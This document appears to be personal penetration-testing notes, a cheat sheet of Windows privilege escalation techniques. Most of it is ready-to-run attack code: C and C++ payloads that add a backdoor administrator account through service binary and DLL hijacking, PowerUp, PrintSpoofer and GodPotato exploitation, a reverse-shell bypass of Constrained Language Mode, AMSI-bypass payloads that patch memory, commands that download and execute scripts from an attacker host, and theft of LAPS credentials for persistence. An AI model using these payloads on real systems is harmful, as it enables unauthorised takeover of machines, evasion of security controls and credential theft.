# Windows PrivEsc
Before attempting to leverage the techniques laid out below the enumeration tactics from the `enumeration/windows.md` section should be leveraged.

## Automatic PrivEsc

### Binary Hijacking (PowerUp.ps1)
Nb. This tool (like most) should not be trusted implicitly always and if it fails where enumeration suggests it ought to have succeeded then manual techniques should be employed. By default on a successful exploit it will create an admin user with name `john` and password `Password123!`.

Grab PowerUp:
```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```
Load the Powershell module:
```powershell
iwr -uri http://<our IP>/PowerUp.ps1 -Outfile PowerUp.ps1
```
```powershell
powershell -ep bypass
```
```powershell
. .\PowerUp.ps1
```
Identify the vulnerable binary:
```powershell
Get-ModifiableServiceFile
```
and exploit:
```powershell
Install-ServiceBinary -Name 'vulnerable-service'
```

### Unquoted Service Paths (PowerUp.ps1)
Grab PowerUp:
```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```
Load the Powershell module:
```powershell
iwr -uri http://<our IP>/PowerUp.ps1 -Outfile PowerUp.ps1
```
```powershell
powershell -ep bypass
```
```powershell
. .\PowerUp.ps1
```
Identify the vulnerable service:
```powershell
Get-UnquotedService
```
With the vulnerable service identified, feed forward the name and path. Nb. be sure to use the exploit path rather than the actual current location of the binary:
```powershell
Write-ServiceBinary -Name 'VulnerableService' -Path "C:\Program Files\Dumb Apps\Tomfoolery.exe"
```
Don't forget to restart the service!
```powershell
Restart-Service VulnerableService
```

### SeImpersonate
If when running `whoami /priv` we notice that our current user has `SeImpersonatePrivilege`, then we have potential privesc:

Grab the exploit binary like so:
```powershell
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```
and run like so:
```powershell
.\PrintSpoofer64.exe -i -c powershell.exe
```
Nb. experience in the labs has shown that `PrintSpoofer64.exe` won't reliably work, even when the vulnerability exists. By contrast, `GodPotato` rarely fails:
```powershell
.\GodPotato-NET4.exe -cmd "cmd /c C:\Users\chump\payload.exe"
```

## Manual PrivEsc

### Binary Hijacking
Save the following `C` file on Kali host as `adduser.c`:
```C
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user ggilligan12 password123! /add");
  i = system ("net localgroup administrators ggilligan12 /add");
  
  return 0;
}
```
Cross-compile like so, then start the ever faithful web server:
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
python3 -m http.server 80
```
On the target machine grab the binary:
```powershell
iwr -uri http://<our IP>/adduser.exe -Outfile adduser.exe
```
Move the original binary to a safe place, and replace it with our payload:
```powershell
move C:\path\to\vulnerable\binary.exe binary.exe
move .\adduser.exe C:\path\to\vulnerable\binary.exe
```
Finally restart the service:
```powershell
net stop vulnerable-service
```
If that fails try restarting the machine altogether, leveraging the possiblity that the service will start automatically on startup (verifying this is the case can be done with the relevant command in the `enumeration/windows.md` section):
```powershell
shutdown /r /t 0
```

### DLL Hijacking
Sometimes the file that hosts a binary executable that is running as a service will not be writable, but the DLLs it uses might be. In this event we have an additional way to execute system commands with elevated privilege and add our admin user.

Save the following `C++` file on Kali host as `adduser.cpp`:
```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
        i = system ("net user ggilligan12 password123! /add");
        i = system ("net localgroup administrators ggilligan12 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
Cross compile and serve:
```bash
x86_64-w64-mingw32-gcc adduser.cpp --shared -o adduser.dll
python3 -m http.server 80
```
Grab it on the target machine:
```powershell
iwr -uri http://<our IP>/adduser.dll -Outfile adduser.dll
```
Shift it to the vulnerable directory and rename appropriately. Then restart the relevant service:
```powershell
Restart-Service vulnerable-service
```

### Unquoted Service Paths
Run the following to establish the presence of an unquoted service path:
```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
If one is found, then write the appropriate malicious binary to the correct path. The C program in the Binary Hijacking section will do nicely.

If the unquoted path reads:
```
C:\Program Files\Silly little spaces\myProgram.exe
```
then we have our choice of the following to write our payload to:
```
C:\Program.exe
C:\Program Files\Silly.exe
C:\Program Files\Silly little.exe
```
There will be as many potential locations of malicious payload as there are spaces in the unquoted service path.

### Scheduled Tasks
In exactly the same vein as binary/DLL hijacking, we're looking to find a binary that is running/will be run as a powerful user, and edit the binary to privesc. Another avenue to exploit here is scheduled tasks. Exactly what they sound like, and exploited in exactly the same way. Enumerated like so:
```cmd
schtasks /query /fo LIST /v
```

### Command Line to RDP
Without a GUI session on a Windows box certain things can become pretty difficult. If we have local admin on a machine the following will allow us to upgrade a shell to a full RDP session as the local admin. Consider saving as a script and just running this:

Update the Administrator password
```powershell
$Password = ConvertTo-SecureString "12345abcde" -AsPlainText -Force;Get-LocalUser -Name "Administrator" | Set-LocalUser -Password $Password
```
Add the Administrator to the RDP Users group if they aren't already there
```powershell
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Administrator"
```
Enable RDP on the machine
```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```
It should now be possible to RDP to the machine, not withstanding any further pivoting/port-forwarding that may be necessary:
```bash
xfreerdp /v:192.168.12.34 /u:Administrator /p:12345abcde
```

### CLM & AMSI Bypass

The Constrained Language Mode is something we may well find ourselves dumped in once we get a foothold on a machine. This constraint is placed on us by the deployment of AppLocker on the host. AppLocker has had (and apparently continues to have) difficulties being effectively applied to custom runspaces that are created from within a Powershell session. Therefore a reliable bypass is available in the form of creating a custom runspace and deploying a new reverse shell from there.

For our purposes there is a convenient `.csproj` file kindly provided by the author of this repo that returns a reverse shell from inside the custom runspace: https://github.com/Sh3lldon/FullBypass/tree/main

Having copied the `.csproj` to an appropriate writable dir, eg. `C:\Windows\Tasks` or `C:\Windows\Temp`, simply run via `msbuild.exe`:
```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe .\FullBypass.csproj
```
To check our CLM bypass has succeeded:
```powershell
$ExecutionContext.SessionState.LanguageMode
```

### AMSI Bypass

There are a _lot_ of approaches to AMSI bypass, to the extent that it doesn't seem helpful to list them here, but here's a good resource: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

Two that we'll keep in our backpocket are presented here, this first one should be run directly in the console as a one-liner:
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

This one should be saved as a payload and executed via the DownloadString | IEX method:
```powershell
function LookupFunc {
	Param ($moduleName, $functionName)
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
function getDelegateType {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)
	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
      [System.MulticastDelegate])
  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')
  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')
	return $type.CreateType()
}
```
Having saved the functions above in a script called `heavy-ams-bypass.ps1` and serving it on a suitable web server:
```powershell
IEX ((New-Object System.Net.WebClient).DownloadString('http://192.168.x.y/heavy-ams-bypass.ps1'));[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession;$oldProtectionBuffer = 0;$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])));$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
```

### LAPS

The Local Administrator Password Solution is intended to help administrators manage the local administrator credentials of domain joined machines. A consequence is that cleartext credentials for the local administrator exist on machines that use LAPS.

These credentials are protected by group membership naturally. Explicit privileges to read LAPS data are needed. As is always the case with this sort of thing, there's every chance that this has been misconfigured.

To enumerate groups with the privilege required to read LAPS data:
```powershell
IEX ((New-Object System.Net.WebClient).DownloadString('http://192.168.x.y/LAPSToolkit.ps1')); Find-LAPSDelegatedGroups
```
Get that groups membership:
```powershell
Get-NetGroupMember -GroupName "<insert relevant group>"
```
To retrieve the Administrator password:
```powershell
IEX ((New-Object System.Net.WebClient).DownloadString('http://192.168.x.y/LAPSToolkit.ps1')); Get-LAPSComputers
```

To leverage this to persist access:
```powershell
$username = "$(hostname)\Administrator"
$password = ConvertTo-SecureString "YourLAPSAdminPassword" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $password)
Invoke-Command -ComputerName "$(hostname)" -Credential $credential -ScriptBlock { net user ggilligan12 password123! /add; net localgroup administrators ggilligan12 /add}
```
